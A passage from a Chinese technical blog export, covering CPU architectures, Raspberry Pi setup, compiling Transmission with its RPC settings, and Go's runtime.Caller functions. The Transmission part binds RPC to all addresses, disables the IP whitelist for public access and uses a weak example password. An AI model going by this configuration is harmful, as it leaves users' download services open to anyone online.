\n\n\n\nCPU有着处理指令、执行操作、控制时间、处理数据四大作用，打个比喻来说，CPU就像我们的大脑，帮我们完成各种各样的生理活动。因此如果没有CPU，那么电脑就是一堆废物，无法工作。移动设备其实很复杂，这些CPU需要执行数以百万计的指示，才能使它向我们期待的方向运行，而CPU的速度和功率效率是至关重要的。速度影响用户体验，而效率影响电池寿命。最完美的移动设备是高性能和低功耗相结合。 \n\n\n\n## 2. CPU的架构\n\n从CPU发明到现在，有非常多种架构，从我们熟悉的X86，ARM，到不太熟悉的MIPS，IA64，它们之间的差距都非常大。但是如果从最基本的逻辑角度来分类的话，它们可以被分为两大类，即所谓的“复杂指令集”与“精简指令集”系统，也就是经常看到的“CISC”与“RISC”。\n\n\n\n Intel和ARM处理器的第一个区别是，前者使用复杂指令集（CISC)，而后者使用精简指令集（RISC）。属于这两种类中的各种架构之间最大的区别，在于它们的设计者考虑问题方式的不同。\n\n\n\n我们可以继续举个例子，比如说我们要命令一个人吃饭，那么我们应该怎么命令呢？我们可以直接对他下达“吃饭”的命令，也可以命令他“先拿勺子，然后舀起一勺饭，然后张嘴，然后送到嘴里，最后咽下去”。从这里可以看到，对于命令别人做事这样一件事情，不同的人有不同的理解，有人认为，如果我首先给接受命令的人以足够的训练，让他掌握各种复杂技能（即在硬件中实现对应的复杂功能），那么以后就可以用非常简单的命令让他去做很复杂的事情——比如只要说一句“吃饭”，他就会吃饭。但是也有人认为这样会让事情变的太复杂，毕竟接受命令的人要做的事情很复杂，如果你这时候想让他吃菜怎么办？难道继续训练他吃菜的方法？我们为什么不可以把事情分为许多非常基本的步骤，这样只需要接受命令的人懂得很少的基本技能，就可以完成同样的工作，无非是下达命令的人稍微累一点——比如现在我要他吃菜，只需要把刚刚吃饭命令里的“舀起一勺饭”改成“舀起一勺菜”，问题就解决了，多么简单。这就是“复杂指令集”和“精简指令集”的逻辑区别。\n\n<!-- more -->\n\n\n\n## 3. CPU常见架构\n\n##### X86\n\n978年6月8日，Intel发布了史诗级的CPU处理器8086，由此X86架构传奇正式拉开帷幕。首次为8086引入X86作为计算机语言的指令集，定义了一些基本使用规则，X86架构使用的是CISC复杂指令集。同时8086处理器的大获成功也直接让Intel成为了CPU巨头.\n\n##### IA64（Intel Architecture 64，英特尔架构64）\n\n哇，IA64听起来好陌生，是的，虽然同出Intel之手。但这可以说是失败品。当年X86过渡到64位指令集时，一个不小心被AMD弯道超车，最后只能联合惠普推出了属于自己的IA64指令集，但这也仅限于服务器上，也是Itanium安腾处理器的来历（现在已经凉了）\n\n至于IA64究竟是RISC还是CISC指令集的延续，这个真的很难说清楚，但单纯以IA64基于HP的EPIC（Explicitly Parallel Instruction Computers，精确并行指令计算机）来看，似乎更偏向于RISC体系。\n\n##### MIPS（Microprocessor without interlockedpipedstages，无内部互锁流水级的微处理器）\n\n在上世纪80年代由美国斯坦福大学Hennessy教授的研究小组研发，它采用精简指令系统计算结构(RISC)来设计芯片。和Intel采用的复杂指令系统计算结构(CISC)相比，RISC具有设计更简单、设计周期更短等优点，并可以应用更多先进的技术，开发更快的下一代处理器。\n\nMIPS是出现最早的商业RISC架构芯片之一，新的架构集成了所有原来MIPS指令集，并增加了许多更强大的功能。MIPS自己只进行CPU的设计，之后把设计方案授权给客户，使得客户能够制造出高性能的CPU。\n\n让MIPS出名的，可能是在2007年，中科院计算机研究所的龙芯处理器获得了MIPS的全部专利、指令集授权，中国开始走上了一MIPS为基础的CPU研发道路。\n\n##### PowerPC\n\nPowerPC是有蓝色巨人IBM联合苹果(早期mac用的就是这个)、摩托罗拉公司研发的一种基于RISC精简指令集的CPU，PowerPC架构最大优点是灵活性非常好，核心数目灵活可变，因此在嵌入式设备上具有很高效益，可以针对服务器市场做超多核，针对掌机做双核，因此它具有优异的性能、较低的能量损耗以及较低的散热量。\n\n##### ARM（Advanced RISC Machine，进阶精简指令集机器）\n\nARM可以说是一个异军突起的CPU架构，采用了RISC精简指令集，而且ARM发展到今天，架构上非常灵活，可以根据面向应用场景不同使用不同设计的内核，因此可以广泛用于嵌入式系统中，同时它高度节能的特性，目前各种移动设备中全都是它的身影。据统计，使用ARM架构的芯片年出货量高达200亿片，随着物联网时代降临，对于低功耗性ARM芯片需求量会发生爆炸性增长。\n\n\n\n## 4. CPU架构问题总结\n\n##### CISC、RISC之争\n\n从上面得知，历史的长河里面，有过许许多多的CPU架构，它们之间的差异性非常大，经过时间、用户的检验，我们平常所接触到CPU架构也就剩X86和ARM两者，按照最核心的不同可以被分为两大类，即“复杂指令集”与“精简指令集”系统，也就是经常看到的“CISC”与“RISC”。\n\n\n\n要了解X86和ARM CPU架构，就得先了解CISC复杂指令集和RISC精简指令集 ，因为它们第一个区别就是X86使用了复杂指令集（CISC），而后者使用精简指令集（RISC）。造成他们使用不同该指令集的原因在于，面向的设备、对象、性能要求是不一样。\n\n手机SoC普遍都是采用ARM提供的核心作为基础，依据自身需求改变SoC的核心架构，而ARM正正是RISC精简指令集的代表人物。CPU巨头Intel、AMD所采用的X86架构已经沿用了数十年，是CISC复杂指令集的典型代表。\n\n\n\n##### 为什么x86不叫x32\n\nx86，x64，看似写法类似，但实际上代表了完全不同的含义。简单来说，x86指的是cpu的架构，x64是cpu位数。笼统的说，前者代表cpu的逻辑结构，后者是cpu运算能力。除了x86架构的cpu外，还有很多不同架构的cpu，其中最有名的就是IA架构，即intel安腾架构。两者之间的系统、软件不能通用。\n\n而x64的全称叫x86-64，也就是说x64是x86架构的64位cpu。\n\n\n\nx86架构中，最早的cpu是16位的，即8086，其前身还有8位的8008和4位的4004，但后两者是另外的架构。后出的80386已经升级到32位。\n\n这样就可以解释开始的问题了。x86是一种架构的命名，代表所有的该架构下的cpu，包括16位，32位，64位，将来也许会有128位。之所以用x86代表32位系统，是一种通俗用法罢了，是不严谨甚至有误的。由于16位cpu早已淘汰不用了，而在64位出来前，32位cpu占据了很长一段时间，所以习惯性的用x86代表32位cpu。而x64是一个简写，告诉大家的是：我是x86架构中的64位cpu。\n\n\n\n如果严谨的按命名规则来看，现在的x86应该叫x86-32，简称x32。以前16位的8086则应该叫x86-16，简称x16。因此，x86不叫x32，只是一种习称，一种误称。\n\nIA架构下的cpu命名则比较严谨，32位就叫IA32，64就叫IA64。\n\n\n\n##### mac上可以玩iphone的app吗\n\nXcode自带的iOS模拟器并不是真正意义上的模拟器,他没有运行arm指令的能力,之所以你可以用它调试你开发的app,是因为调试目标选为模拟器的时候,Xcode生成的代码是x86/x86_64架构用的,具体是x86还是x86_64取决于你选的机型,如果你选iPhone5S之前的机型的模拟器,那就是x86.\n\n\n\n换个说法,就是这个模拟器并没有模拟arm处理器等硬件,只是在x86/x86_64架构上提供了和iOS一样的接口的SDK,其接口的行为也和iOS上几乎一样.之所以说几乎一样,是因为真的有不一样的地方.\n\n\n\n好了,到这里你知道了,这个模拟器其实就是一个app,模拟下iOS的行为,那些跑在里面的app,其实也都是x86/x86_64的, 而app store上上架的那些app, 都不会包含x86/x86_64架构,只支持arm架构,所以无论如何你也没办法在电脑上运行他们.\n\n至于为什么android可以,因为android是开源的,使用的处理器架构也是资料丰富,所以可以开发出来真正的可以虚拟arm处理器以及其它硬件的模拟器,这样就可以在电脑上运行android app了.而iPhone, iTouch, iPad使用的处理器估计目前还没有谁能真正模拟出来, 就算有这种能人, 他也未必有做模拟器的想法,就算有这个想法,那也未必有那个胆量.\n\n\n\n最后说个常识:\n\n在开发iOS app接入第三方sdk的时候, 偶尔会遇到模拟器无法正确link, 但是真机可以的情况.这其实就是因为sdk提供商提供的sdk,根本就没支持x86/x86_64,鄙视\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["cpu"],"categories":["系统"]},{"title":"在树莓派arm上运行golang和c程序","url":"%2Fp%2F21dd607c.html","content":"\n\n## 树莓派基础设置\n\n##### 树莓派修改键盘布局\n\n```\nsudo dpkg-reconfigure keyboard-configuration\n```\n\n选通用的101键PC键盘\n\n在键盘layout选择中，选Other\n\n然后在选项中，选English(US)\n\n再选English(US, alternative international)\n\n一直下一步,最后重启\n\n```\nsudo reboot\n```\n\n\n\n##### 树莓派修改启动进入终端界面\n\n```\n\nsudo raspi-config\n\nboot option ->console\n\n```\n<!-- more -->\n\n\n##### 树莓派开启ssh\n\n```\n\nsudo raspi-config\n\nSelect Interfacing Options\n\nNavigate to and select SSH\n\nChoose Yes\n\nSelect Ok\n\nChoose Finish\n\n\nsudo systemctl enable ssh\n\nsudo systemctl start ssh\n```\n\n\n\n## 编译golang为arm可执行程序\n\n\n\n```\nGOOS=linux GOARCH=arm GOARM=6 go build -v\n```\n\n\n\nGOARM=5: use software floating point; when CPU doesn't have VFP co-processor\n\nGOARM=6: use VFPv1 only; default if cross compiling; usually ARM11 or better cores (VFPv2 or better is also supported)\n\nGOARM=7: use VFPv3; usually Cortex-A cores\n\n\n\n## 编译arm可执行程序\n\n缺少的程序直接使用`包管理`下载即可\n\n##### 解决下载软件包连接不上的问题 connect to mirrors.opencas.cn....\n\n   ```\nsudo vim /etc/apt/sources.list \n   \n替换源为\n   \ndeb http://mirrors.shu.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi\n   \nsudo apt-get update&& sudo apt-get -y dist-upgrade&&sudo apt-get update \n   ```\n","tags":["树莓派"],"categories":["系统"]},{"title":"transmission编译安装和golang_rpc的调用","url":"%2Fp%2Fbf531b37.html","content":"\n### 1. mac编译transmission\n\n+ 下载项目\n\n```bash\ngit clone https://github.com/transmission/transmission Transmission\ncd Transmission\ngit submodule update --init\nXcode project file (Transmission.xcodeproj) for building in Xcode. \n```\n\n\n\n+ 在 xcode中编译\n\n  下图第一个是编译 mac 的应用程序,  第二个是可以编译 transmission-daemon 程序\n\n![1](transmission/1.png)\n\n<!-- more -->\n\n\n\n### 2. ubuntu 16.04编译transmission\n\n```bash\n$ sudo apt-get install cmake make build-essential automake autoconf libtool pkg-config intltool libcurl4-openssl-dev libglib2.0-dev libevent-dev libminiupnpc-dev libgtk-3-dev libappindicator3-dev gettext libssl-dev\n\n$ git clone https://github.com/transmission/transmission Transmission\n$ cd Transmission\n$ git submodule update --init\n$ mkdir build\n$ cd build\n$ cmake ..\n$ make\n$ sudo make install (make install DESTDIR=a)\n```\n\n安装完成后出现以下命令:\n\n![2](transmission/2.png)\n\n\n\n编译时遇到的问题:\n\n1. CMAKE_MAKE_PROGRAM is not set\n\n```\nsudo apt-get install gettext\nsudo apt-get install make \nsudo apt-get install libssl-dev\n```\n\n2. missing: CURL_LIBRARY CURL_INCLUDE_DIR\n\n```\nsudo apt-get install libcurl4-openssl-dev//ubuntu\nyum install curl-devel//centos\n```\n\n3. autogen.sh: not found\n\n```\nsudo apt-get install autoconf\nsudo apt-get install automake\nsudo apt-get install libtool\n```\n\n4. transmission libevent 变成了event\n\n   把所有的依赖全部装一遍, 安装后删除build. 重新cmake一下\n\n5. undefined reference to `g_log_structured_standard`\n\n   ```bash\n   apt-get remove --purge libglib*\n   apt-get install libglib-2.x-y  # where x and y are whatever the package version says.\n   ```\n\n   \n\n\n\n### 3. transmission 介绍\n\n- transmission-cli： 独立的命令行客户端。\n- transmission-create： 用来建立.torrent种子文件的命令行工具。\n- transmission-daemon： 后台守护程序。\n- transmission-edit： 用来修改.torrent种子文件的announce URL。\n- transmission-remote： 控制daemon的程序。\n- transmission-show：查看.torrent文件的信息。\n\n\n\n1. 配置文件目录里面包含如下一些文件：\n\n- settings.json： 主要的配置文件，设置daemon的各项参数，包括RPC的用户名密码配置。它实际上是一个符号链接，指向的原始文件是/etc/transmission-daemon/settings.json。里面的参数解释可以参考官网的配置说明。\n- torrents/： 用户存放.torrent种子文件的目录,凡是添加到下载任务的种子，都存放在这里。.torrent的命名包含,种子文件本身的名字和种子的SHA1 HASH值。\n- resume/： 该存放了.resume文件，.resume文件包含了一个种子的信息，例如该文件哪些部分被下载了，下载的数据存储的位置等等。\n- blocklists/： 存储被屏蔽的peer的地址。\n- dht.dat： 存储DHT节点信息。\n\n\n\n配置主要是通过修改 `/var/lib/transmission-daemon/info/settings.json` 文件中的参数来实现的。 **注意**：在编辑 transmission 配置文件的时候，需要先关闭 daemon 进程，否则编辑的参数将会被恢复到原来的状态。\n\n\n\n2. RPC参数介绍: \n\n```\n{\n\"download-dir\": \"/down\", #下载目录的绝对路径\n\"incomplete-dir\": \"/down/temp\", #临时文件路径\n\"rpc-authentication-required\": true, #启用验证\n\"rpc-bind-address\": \"0.0.0.0\", #允许任何IP通过RPC协议访问\n\"rpc-enabled\": true, #允许通过RPC访问\n\"rpc-password\": \"123456\", #RPC验证密码（保存并启动后daemon会计算并替换为HASH值以增加安全性）\n\"rpc-port\": 9091, #RPC端口\n\"rpc-username\": \"transmission\", #RPC验证用户名\n\"rpc-whitelist\": \"*\", #RPC访问白名单\n\"rpc-whitelist-enabled\": false, #关闭白名单功能以便公网访问\n}\n```\n\n更多参数说明请见[官方Wiki](https://github.com/transmission/transmission/wiki/Editing-Configuration-Files)\n\n\n\n### 4. mac使用web界面控制transmission daemon\n\n\n\n+ 运行Xcode 编译好的客户端, 设置 Remote\n\n\n\n![2](transmission/3.png)\n\n\n\n\n\n在浏览器中访问`http://localhost:9091/transmission/web` 并输入设置的用户名及密码就可以看到如下界面\n\n![2](transmission/4.png)\n\n+ 运行Xcode编译好的transmission-daemon\n\n \n\n配置文件在 `/Users/liuwei/Library/Application\\ Support/transmission-daemon/settings.json` \n\n设置环境变量后 `export TRANSMISSION_WEB_HOME=/Users/liuwei/workspace/transmission/web`\n\n通过浏览器访问`http://localhost:9091/transmission/web`\n\n\n\n+ 访问外网ip错误\n\nunauthorized ip address403: ForbiddenUnauthorized IP Address.Either disable the IP address whitelist or add your address to it.If you're editing settings.json, see the 'rpc-whitelist' and 'rpc-whitelist-enabled' entries.If you're still using ACLs, use a whitelist instead. See the transmission-daemon manpage for details.\n\n\n\n```\ntransmission/.config/transmission-daemon/settings.json  \n\n\"rpc-whitelist-enabled\": true,  ture改成false。\n```\n\n\n\n### 5. golang通过rpc调用transmission\n\n\n\n+ rpc api\n\nhttps://github.com/transmission/transmission/blob/master/extras/rpc-spec.txt\n\n+ golang lib for Transmission API\n\nhttps://github.com/pyed/transmission","tags":["transmission"],"categories":["bittorrent"]},{"title":"golang_runtime函数调用信息","url":"%2Fp%2F375281af.html","content":"\n\n函数的调用信息是程序中比较重要运行期信息, 在很多场合都会用到(比如调试或日志)。\n\nGo 语言 `runtime` 包的 `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` 等几个函数提供了获取函数调用者信息的方法.\n\n \n\n这几个函数的文档链接:\n\n- <http://golang.org/pkg/runtime/#Caller>\n\n- <http://golang.org/pkg/runtime/#Callers>\n\n- <http://golang.org/pkg/runtime/#FuncForPC>\n\n  \n\n## runtime.Caller的用法(常用)\n\n函数的签名如下:\n\n```\nfunc runtime.Caller(skip int) (pc uintptr, file string, line int, ok bool)\n```\n\n`runtime.Caller` 返回当前 `goroutine` 的栈上的函数调用信息. 主要有当前的`pc` 值和调用的文件和行号等信息. 若无法获得信息, 返回的 `ok` 值为 `false`.\n\n <!-- more -->\n\n其输入参数 `skip` 为要跳过的栈帧数, 若为 `0` 则表示 `runtime.Caller` 的调用者.\n\n*注意:由于历史原因, runtime.Caller 和 runtime.Callers 中的 skip 含义并不相同, 后面会讲到.*\n\n\n\n下面是一个简单的例子, 打印函数调用的栈帧信息:\n\n```\nfunc main() {\n\tfor skip := 0; skip < 3; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198453, file = caller.go, line = 10\n\t// skip = 1, pc = 4280066, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4289712, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n}\n```\n\n\n\n## runtime.Callers的用法\n\n函数的签名如下:\n\n```\nfunc runtime.Callers(skip int, pc []uintptr) int\n```\n\n`runtime.Callers` 函数和 `runtime.Caller` 函数虽然名字相似(多一个后缀`s`), 但是函数的参数/返回值和参数的意义都有很大的差异.\n\n\n\n`runtime.Callers` 把调用它的函数Go程栈上的程序计数器填入切片 `pc` 中. 参数 `skip` 为开始在 pc 中记录之前所要跳过的栈帧数, **若为 0 则表示 runtime.Callers 自身的栈帧, 若为 1 则表示调用者的栈帧**. 该函数返回写入到 `pc` 切片中的项数(受切片的容量限制).\n\n\n\n下面是 `runtime.Callers` 的例子, 用于输出每个栈帧的 `pc` 信息:\n\n```\nfunc main() {\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4304486 4198562 4280114 4289760]\n\t// skip = 1, pc = [4198562 4280114 4289760]\n\t// skip = 2, pc = [4280114 4289760]\n\t// skip = 3, pc = [4289760]\n}\n```\n\n输出新的 `pc` 长度和 `skip` 大小有逆相关性. `skip = 0` 为 `runtime.Callers` 自身的信息.\n\n这个例子比前一个例子多输出了一个栈帧, 就是因为多了一个 `runtime.Callers` 栈帧的信息 (前一个例子是没有 `runtime.Caller` 信息的(*注意:没有 s 后缀*)).\n\n\n\n## runtime.Callers 和 runtime.Caller 的异同\n\n因为前面2个例子为不同的程序, 输出的 `pc` 值并不具备参考性. 现在我们看看在同一个例子的输出结果如何:\n\n \n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456, file = caller.go, line = 10\n\t// skip = 1, pc = 4280962, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4290608, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4305334 4198635 4280962 4290608]\n\t// skip = 1, pc = [4198635 4280962 4290608]\n\t// skip = 2, pc = [4280962 4290608]\n\t// skip = 3, pc = [4290608]\n}\n```\n\n比如输出结果可以发现, `4280962` 和 `4290608` 两个 `pc` 值是相同的. 它们分别对应 `runtime.main` 和 `runtime.goexit` 函数.\n\n\n\n`runtime.Caller` 输出的 `4198456` 和 `runtime.Callers` 输出的 `4198635` 并不相同. 这是因为, 这两个函数的调用位置并不相同, 因此导致了 `pc` 值也不完全相同.\n\n\n\n最后就是 `runtime.Callers` 多输出一个 `4305334` 值, 对应`runtime.Callers`内部的调用位置.\n\n由于Go语言(Go1.2)采用分段堆栈, 因此不同的 `pc` 之间的大小关系并不明显.\n\n\n\n## runtime.FuncForPC 的用途\n\n函数的签名如下:\n\n```\nfunc runtime.FuncForPC(pc uintptr) *runtime.Func\nfunc (f *runtime.Func) FileLine(pc uintptr) (file string, line int)\nfunc (f *runtime.Func) Entry() uintptr\nfunc (f *runtime.Func) Name() string\n```\n\n\n\n其中 `runtime.FuncForPC` 返回包含给定 `pc` 地址的函数, 如果是无效 `pc` 则返回 `nil` .\n\n`runtime.Func.FileLine` 返回与 `pc` 对应的源码文件名和行号. 安装文档的说明, 如果`pc`不在函数帧范围内, 则结果是不确定的.\n\n`runtime.Func.Entry` 对应函数的地址. \n\n`runtime.Func.Name` 返回该函数的名称. \n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, _, _, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tp := runtime.FuncForPC(pc)\n\t\tfile, line := p.FileLine(0)\n\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  entry = %v\\n\", p.Entry())\n\t\tfmt.Printf(\"  name = %v\\n\", p.Name())\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456\n\t//   file = caller.go, line = 8\n\t//   entry = 4198400\n\t//   name = main.main\n\t// skip = 1, pc = 4282882\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//   entry = 4282576\n\t//   name = runtime.main\n\t// skip = 2, pc = 4292528\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//   entry = 4292528\n\t//   name = runtime.goexit\n\t\n\t\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t\tfor j := 0; j < n; j++ {\n\t\t\tp := runtime.FuncForPC(pc[j])\n\t\t\tfile, line := p.FileLine(0)\n\n\t\t\tfmt.Printf(\"  skip = %v, pc = %v\\n\", skip, pc[j])\n\t\t\tfmt.Printf(\"    file = %v, line = %d\\n\", file, line)\n\t\t\tfmt.Printf(\"    entry = %v\\n\", p.Entry())\n\t\t\tfmt.Printf(\"    name = %v\\n\", p.Name())\n\t\t}\n\t\tbreak\n\t}\n\t// Output:\n\t// skip = 0, pc = [4307254 4198586 4282882 4292528]\n\t//   skip = 0, pc = 4307254\n\t//     file = $(GOROOT)/src/pkg/runtime/runtime.c, line = 315\n\t//     entry = 4307168\n\t//     name = runtime.Callers\n\t//   skip = 0, pc = 4198586\n\t//     file = caller.go, line = 8\n\t//     entry = 4198400\n\t//     name = main.main\n\t//   skip = 0, pc = 4282882\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//     entry = 4282576\n\t//     name = runtime.main\n\t//   skip = 0, pc = 4292528\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//     entry = 4292528\n\t//     name = runtime.goexit\n}\n```\n\n\n\n根据测试, 如果是无效 `pc` (比如`0`), `runtime.Func.FileLine` 一般会输出当前函数的开始行号. 不过在实践中, 一般会用 `runtime.Caller` 获取文件名和行号信息, `runtime.Func.FileLine` 很少用到.\n\n\n\n## 定制的 CallerName 函数\n\n基于前面的几个函数, 我们可以方便的定制一个 `CallerName` 函数. 函数 `CallerName` 返回调用者的函数名/文件名/行号等用户友好的信息.\n\n\n\n```\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\tvar pc uintptr\n\tif pc, file, line, ok = runtime.Caller(skip + 1); !ok {\n\t\treturn\n\t}\n\tname = runtime.FuncForPC(pc).Name()\n\treturn\n}\n```\n\n其中在执行 `runtime.Caller` 调用时, 参数 `skip + 1` 用于抵消 `CallerName` 函数自身的调用.\n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v\\n\", skip)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  name = %v\\n\", name)\n\t}\n\t// Output:\n\t// skip = 0\n\t//   file = caller.go, line = 19\n\t//   name = main.main\n\t// skip = 1\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 220\n\t//   name = runtime.main\n\t// skip = 2\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 1394\n\t//   name = runtime.goexit\n}\n```\n\n\n\n## Go 语言中函数的类型\n\n在 Go 语言中, 除了语言定义的普通函数调用外, 还有闭包函数/init函数/全局变量初始化等不同的函数调用类型.\n\n为了便于测试不同类型的函数调用, 我们包装一个 `PrintCallerName` 函数. 该函数用于输出调用者的信息.\n\n```\nfunc PrintCallerName(skip int, comment string) bool {\n\tname, file, line, ok := CallerName(skip + 1)\n\tif !ok {\n\t\treturn false\n\t}\n\tfmt.Printf(\"skip = %v, comment = %s\\n\", skip, comment)\n\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\tfmt.Printf(\"  name = %v\\n\", name)\n\treturn true\n}\n```\n\n\n\n然后编写以下的测试代码(函数闭包调用/全局变量初始化/init函数等):\n\n```\nvar a = PrintCallerName(0, \"main.a\")\nvar b = PrintCallerName(0, \"main.b\")\n\nfunc init() {\n\ta = PrintCallerName(0, \"main.init.a\")\n}\n\nfunc init() {\n\tb = PrintCallerName(0, \"main.init.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.init.b[1]\")\n\t}()\n}\n\nfunc main() {\n\ta = PrintCallerName(0, \"main.main.a\")\n\tb = PrintCallerName(0, \"main.main.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.main.b[1]\")\n\t\tfunc() {\n\t\t\tb = PrintCallerName(0, \"main.main.b[1][1]\")\n\t\t}()\n\t\tb = PrintCallerName(0, \"main.main.b[2]\")\n\t}()\n}\n```\n\n输出结果如下:\n\n```\n// Output:\n// skip = 0, comment = main.a\n//   file = caller.go, line = 8\n//   name = main.init\n// skip = 0, comment = main.b\n//   file = caller.go, line = 9\n//   name = main.init\n// skip = 0, comment = main.init.a\n//   file = caller.go, line = 12\n//   name = main.init·1\n// skip = 0, comment = main.init.b\n//   file = caller.go, line = 16\n//   name = main.init·2\n// skip = 0, comment = main.init.b[1]\n//   file = caller.go, line = 18\n//   name = main.func·001\n// skip = 0, comment = main.main.a\n//   file = caller.go, line = 23\n//   name = main.main\n// skip = 0, comment = main.main.b\n//   file = caller.go, line = 24\n//   name = main.main\n// skip = 0, comment = main.main.b[1]\n//   file = caller.go, line = 26\n//   name = main.func·003\n// skip = 0, comment = main.main.b[1][1]\n//   file = caller.go, line = 28\n//   name = main.func·002\n// skip = 0, comment = main.main.b[2]\n//   file = caller.go, line = 30\n//   name = main.func·003\n```\n\n\n\n观察输出结果, 可以发现以下几个规律:\n\n- 全局变量的初始化调用者为 `main.init` 函数\n- 自定义的 `init` 函数有一个数字后缀, 根据出现的顺序进编号. 比如 `main.init·1` 和 `main.init·2` 等.\n- 闭包函数采用 `main.func·001` 格式命名, 安装闭包定义结束的位置顺序进编号.\n\n \n\n## 不同 Go 程序启动流程\n\n基于函数调用者信息可以很容易的验证各种环境的程序启动流程.\n\n我们需要建立一个独立的 `caller` 目录, 里面有三个测试代码.\n\n`caller/main.go` 主程序:\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n\t\"runtime\"\n)\n\nfunc main() {\n\t_ = PrintCallerName(0, \"main.main._\")\n}\n\nfunc PrintCallerName(skip int, comment string) bool {\n\t// 实现和前面的例子相同\n}\n\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\t// 实现和前面的例子相同\n}\n```\n\n`caller/main_test.go` 主程序的测试文件(同在一个`main`包):\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n)\n\nfunc TestPrintCallerName(t *testing.T) {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\tt.Fail()\n}\n```\n\n`caller/example_test.go` 主程序的包的调用者(在新的`main_test`包):\n\n```\npackage main_test\n\nimport (\n\tmyMain \".\"\n\t\"fmt\"\n)\n\nfunc Example() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := myMain.CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\t// Output: ?\n}\n```\n\n然后进入 `caller` 目录, 运行 `go run test` 可以得到以下的输出结果:\n\n```\nskip = 0, name = caller.TestPrintCallerName, file = caller/main_test.go, line = 10\nskip = 1, name = testing.tRunner, file = $(GOROOT)/src/pkg/testing/testing.go, line = 391\nskip = 2, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n--- FAIL: TestPrintCallerName (0.00 seconds)\n--- FAIL: Example (2.0001ms)\ngot:\nskip = 0, name = caller_test.Example, file = caller/example_test.go, line = 10\n\nskip = 1, name = testing.runExample, file = $(GOROOT)/src/pkg/testing/example.go, line = 98\nskip = 2, name = testing.RunExamples, file = $(GOROOT)/src/pkg/testing/example.go, line = 36\nskip = 3, name = testing.Main, file = $(GOROOT)/src/pkg/testing/testing.go, line = 404\nskip = 4, name = main.main, file = $(TEMP)/go-build365033523/caller/_test/_testmain.go, line = 51\nskip = 5, name = runtime.main, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\nskip = 6, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\nwant:\n?\nFAIL\nexit status 1\nFAIL    caller        0.254s\n```\n\n分析输出数据我们可以发现, 测试代码和例子代码的启动流程和普通的程序流程都不太一样.\n\n`测试代码`的启动流程:\n\n1. `runtime.goexit` 还是入口\n2. 但是 `runtime.goexit` 不在调用 `runtime.main` 函数, 而是调用 `testing.tRunner` 函数\n3. `testing.tRunner` 函数由 `go test` 命令生成, 用于执行各个测试函数\n\n`例子代码`的启动流程:\n\n1. `runtime.goexit` 还是入口\n2. 然后 `runtime.goexit` 调用 `runtime.main` 函数\n3. 